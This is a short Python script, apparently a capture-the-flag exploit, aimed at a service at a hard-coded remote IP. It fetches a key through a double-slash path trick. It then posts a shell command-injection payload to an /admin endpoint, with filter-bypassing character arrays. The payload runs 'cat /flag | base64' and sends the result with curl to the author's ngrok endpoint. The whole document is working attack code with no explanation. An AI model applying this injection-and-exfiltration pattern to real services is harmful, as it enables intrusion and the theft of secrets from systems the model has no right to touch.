import requests
import json

# Remote
target = 'http://34.81.54.62:5487'

# Local
target = 'http://172.23.0.2:8080'

# My ngrok
controlled_endpoint = 'http://a241-2804-14d-5cd0-9ee8-d8a2-ca3d-daa0-d4b1.ngrok.io'

session = requests.Session()

# list comprehension is just beautiful
def strToPoisonArray(s):
    dangerZone = '"|><\\()`'
    return [ [x] if x in dangerZone else x for x in s ]

payload = f'abc" | curl {controlled_endpoint}/fireflag/`cat /flag | base64` | echo "'
service = strToPoisonArray(payload)

print(service)

# Get Key
response = session.get(f'{target}/hello-from-the-world//key')

key = response.text

print(response.status_code)
print(f'Key: {key}')

# Send /admin Payload
params = json.dumps({'key': key, 'service': service})

# Do not forget the double slash
response = session.post(f'{target}/service-info//admin', data=params)

print(response.status_code)
print(response.text)